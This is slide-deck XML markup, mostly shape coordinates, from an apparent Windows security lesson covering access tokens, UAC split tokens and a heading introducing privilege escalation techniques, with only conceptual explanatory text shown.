                    <a:pt x="199202" y="59373"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="196874" y="54845"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="194416" y="50447"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="191699" y="46179"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="188724" y="42039"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="185620" y="38159"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="182386" y="34278"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="178894" y="30656"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="175272" y="27164"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="171391" y="23930"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="167511" y="20826"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="163371" y="17851"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="159103" y="15134"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="154705" y="12676"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="150178" y="10348"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="145650" y="8279"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="140864" y="6338"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="135949" y="4657"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="131033" y="3234"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="125859" y="2070"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="120815" y="1164"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="115511" y="517"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="110208" y="129"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="104775" y="0"/>
                  </a:lnTo>
                  <a:close/>
                </a:path>
              </a:pathLst>
            </a:cu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103"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="2312750" y="1861475"/>
              <a:ext cx="1432575" cy="1992050"/>
            </a:xfrm>
            <a:custGeom>
              <a:rect b="b" l="l" r="r" t="t"/>
              <a:pathLst>
                <a:path extrusionOk="0" fill="none" h="79682" w="57303">
                  <a:moveTo>
                    <a:pt x="12677" y="79681"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="12677" y="79681"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15652" y="75283"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="17980" y="71403"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="19920" y="67910"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="21343" y="64806"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="22378" y="62090"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="23025" y="59891"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="23413" y="58080"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="23542" y="56786"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="23542" y="56786"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="21084" y="56139"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="18627" y="55363"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="16428" y="54458"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14229" y="53294"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12159" y="52000"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10219" y="50448"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8408" y="48896"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6726" y="47085"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5304" y="45144"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4010" y="43075"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2846" y="40876"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1811" y="38547"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1035" y="36219"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="518" y="33761"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="129" y="31174"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="28587"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="28587"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="259" y="25742"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="647" y="22896"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1294" y="20050"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2328" y="17463"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3493" y="15005"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4915" y="12677"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6597" y="10478"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8408" y="8409"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10478" y="6598"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12677" y="4916"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15005" y="3493"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="17592" y="2200"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="20179" y="1294"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="22895" y="647"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="25741" y="130"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="28716" y="1"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="28716" y="1"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="31562" y="130"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="34408" y="647"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="37124" y="1294"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="39840" y="2200"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="42298" y="3493"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="44626" y="4916"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="46825" y="6598"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="48895" y="8409"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="50706" y="10478"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="52388" y="12677"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="53810" y="15005"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="54975" y="17463"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="56009" y="20050"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="56656" y="22896"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="57174" y="25742"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="57303" y="28587"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="57303" y="28587"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="57174" y="31562"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="56915" y="34279"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="56398" y="37125"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="55751" y="39712"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="54845" y="42299"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="53940" y="44886"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="52776" y="47214"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="51611" y="49542"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="50189" y="51871"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="48766" y="54070"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="47214" y="56139"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="45532" y="58209"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="43850" y="60020"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="42039" y="61960"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="40229" y="63642"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="38288" y="65323"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="36477" y="66876"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="34537" y="68428"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="30786" y="71144"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="27035" y="73472"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="23413" y="75413"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="20050" y="77094"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="17204" y="78388"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14617" y="79164"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12677" y="79681"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12677" y="79681"/>
                  </a:lnTo>
                  <a:close/>
                </a:path>
              </a:pathLst>
            </a:custGeom>
            <a:noFill/>
            <a:ln cap="rnd" cmpd="sng" w="517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103"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="3877900" y="1861475"/>
              <a:ext cx="1429350" cy="1992050"/>
            </a:xfrm>
            <a:custGeom>
              <a:rect b="b" l="l" r="r" t="t"/>
              <a:pathLst>
                <a:path extrusionOk="0" fill="none" h="79682" w="57174">
                  <a:moveTo>
                    <a:pt x="12548" y="79681"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="12548" y="79681"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15523" y="75283"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="17980" y="71403"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="19791" y="67910"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="21214" y="64806"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="22249" y="62090"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="22896" y="59891"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="23284" y="58080"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="23413" y="56786"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="23413" y="56786"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="20955" y="56139"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="18498" y="55363"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="16299" y="54458"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14100" y="53294"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12030" y="52000"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10090" y="50448"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8279" y="48896"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6727" y="47085"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5174" y="45144"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3881" y="43075"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2717" y="40876"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1811" y="38547"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1035" y="36219"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="388" y="33761"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="130" y="31174"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="28587"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="28587"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="130" y="25742"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="518" y="22896"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1294" y="20050"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2199" y="17463"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3364" y="15005"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4786" y="12677"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6468" y="10478"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8279" y="8409"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10349" y="6598"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12548" y="4916"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14876" y="3493"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="17463" y="2200"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="20050" y="1294"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="22766" y="647"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="25612" y="130"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="28587" y="1"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="28587" y="1"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="31433" y="130"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="34279" y="647"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="37124" y="1294"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="39711" y="2200"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="42169" y="3493"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="44627" y="4916"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="46826" y="6598"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="48766" y="8409"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="50706" y="10478"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="52259" y="12677"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="53681" y="15005"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="54975" y="17463"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="55880" y="20050"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="56657" y="22896"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="57045" y="25742"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="57174" y="28587"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="57174" y="28587"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="57045" y="31562"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="56786" y="34279"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="56268" y="37125"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="55622" y="39712"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="54846" y="42299"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="53811" y="44886"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="52776" y="47214"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="51482" y="49542"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="50060" y="51871"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="48637" y="54070"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="47084" y="56139"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="45403" y="58209"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="43721" y="60020"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="41910" y="61960"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="40099" y="63642"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="38289" y="65323"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="36348" y="66876"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="34408" y="68428"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="30657" y="71144"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="26906" y="73472"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="23284" y="75413"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="20050" y="77094"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="17075" y="78388"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14488" y="79164"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12548" y="79681"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12548" y="79681"/>
                  </a:lnTo>
                  <a:close/>
                </a:path>
              </a:pathLst>
            </a:custGeom>
            <a:noFill/>
            <a:ln cap="rnd" cmpd="sng" w="517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8" name="Google Shape;868;p103"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3123000" y="457200"/>
            <a:ext cx="5677800" cy="3843000"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchorCtr="0" anchor="t" bIns="91425" lIns="365750" spcFirstLastPara="1" rIns="91425" wrap="square" tIns="91425">
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="1800"/>
              <a:t>UAC is Possible Due to Access Tokens in Windows</a:t>
            </a:r>
            <a:endParaRPr sz="1800"/>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="1000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="0" lang="en" sz="1800"/>
              <a:t>“An access token is an object that describes the security context of a process or thread. The information in a token includes the identity and privileges of the user account associated with the process or thread. When a user logs on, the system verifies the user’s password by comparing it with information stored in a security database.</a:t>
            </a:r>
            <a:br>
              <a:rPr b="0" lang="en" sz="1800"/>
            </a:br>
            <a:r>
              <a:rPr b="0" lang="en" sz="1800"/>
              <a:t>If the password is authenticated, the system produces an access token. Every process executed on behalf of this user has a copy of this token.”</a:t>
            </a:r>
            <a:endParaRPr b="0" sz="1800"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="869" name="Google Shape;869;p103"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="196475" y="4568825"/>
            <a:ext cx="3000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rgbClr val="2E5E73"/>
                </a:solidFill>
                <a:latin typeface="Roboto Light"/>
                <a:ea typeface="Roboto Light"/>
                <a:cs typeface="Roboto Light"/>
                <a:sym typeface="Roboto Light"/>
              </a:rPr>
              <a:t>Source:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" sz="1300">
                <a:solidFill>
                  <a:srgbClr val="2E5E73"/>
                </a:solidFill>
                <a:latin typeface="Roboto"/>
                <a:ea typeface="Roboto"/>
                <a:cs typeface="Roboto"/>
                <a:sym typeface="Roboto"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" sz="1300" u="sng">
                <a:solidFill>
                  <a:schemeClr val="hlink"/>
                </a:solidFill>
                <a:latin typeface="Roboto Light"/>
                <a:ea typeface="Roboto Light"/>
                <a:cs typeface="Roboto Light"/>
                <a:sym typeface="Roboto Light"/>
                <a:hlinkClick r:id="rId3"/>
              </a:rPr>
              <a:t>learn.microsoft.com</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" sz="1100"/>
              <a:t>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pic>
        <p:nvPicPr>
          <p:cNvPr id="874" name="Google Shape;874;p104"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill rotWithShape="1">
          <a:blip r:embed="rId3">
            <a:alphaModFix/>
          </a:blip>
          <a:srcRect b="0" l="0" r="0" t="15952"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="-1" y="0"/>
            <a:ext cx="9168599" cy="5143502"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="875" name="Google Shape;875;p104"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="1" type="subTitle"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="0" y="213125"/>
            <a:ext cx="9144000" cy="827700"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchorCtr="0" anchor="t" bIns="0" lIns="457200" spcFirstLastPara="1" rIns="457200" wrap="square" tIns="91425">
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="2000">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>In Windows, administrators have a </a:t>
            </a:r>
            <a:r>
              <a:rPr b="1" lang="en" sz="2000">
                <a:solidFill>
                  <a:schemeClr val="dk2"/>
                </a:solidFill>
                <a:highlight>
                  <a:schemeClr val="accent1"/>
                </a:highlight>
              </a:rPr>
              <a:t>split token</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" sz="2000">
                <a:solidFill>
                  <a:schemeClr val="dk2"/>
                </a:solidFill>
                <a:highlight>
                  <a:schemeClr val="accent1"/>
                </a:highlight>
              </a:rPr>
              <a:t>,</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" sz="2000">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en" sz="2000">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en" sz="2000">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>meaning they log on with standard user permissions. </a:t>
            </a:r>
            <a:endParaRPr sz="2000">
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="876" name="Google Shape;876;p104"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="3" type="body"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="0" y="2951475"/>
            <a:ext cx="5235300" cy="1910700"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchorCtr="0" anchor="t" bIns="914400" lIns="457200" spcFirstLastPara="1" rIns="457200" wrap="square" tIns="0">
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="800"/>
              </a:spcAft>
              <a:buSzPts val="935"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Their administrator permissions are not </a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>present until they specifically ask for </a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>them (e.g., right-click and select </a:t>
            </a:r>
            <a:r>
              <a:rPr b="1" lang="en">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Run </a:t>
            </a:r>
            <a:br>
              <a:rPr b="1" lang="en">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr b="1" lang="en">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>as administrator</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>), at which point a new access token is created and applied to whatever new process they created.</a:t>
            </a:r>
            <a:endParaRPr>
              <a:solidFill>
                <a:schemeClr val="lt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0" name="Shape 880"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="881" name="Google Shape;881;p105"/>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latin typeface="Roboto Medium"/>
                <a:ea typeface="Roboto Medium"/>
                <a:cs typeface="Roboto Medium"/>
                <a:sym typeface="Roboto Medium"/>
              </a:rPr>
              <a:t>Privilege Escalation Techniques in Windows</a:t>
            </a:r>
            <a:endParaRPr>
              <a:latin typeface="Roboto Medium"/>
              <a:ea typeface="Roboto Medium"/>
              <a:cs typeface="Roboto Medium"/>
              <a:sym typeface="Roboto Medium"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="882" name="Google Shape;882;p105"/>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883" name="Google Shape;883;p105"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="2" type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="70200" y="588350"/>
            <a:ext cx="7213200" cy="595200"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchorCtr="0" anchor="t" bIns="91425" lIns="365750" spcFirstLastPara="1" rIns="91425" wrap="square" tIns="91425">
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="1200"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="1900">
                <a:latin typeface="Roboto"/>
                <a:ea typeface="Roboto"/>
                <a:cs typeface="Roboto"/>
                <a:sym typeface="Roboto"/>
              </a:rPr>
              <a:t>There are many privilege escalation techniques in Windows and, typically, two “paths” to privilege escalation:</a:t>
            </a:r>
            <a:endParaRPr sz="1900">
              <a:latin typeface="Roboto"/>
              <a:ea typeface="Roboto"/>
              <a:cs typeface="Roboto"/>
              <a:sym typeface="Roboto"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="884" name="Google Shape;884;p105"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
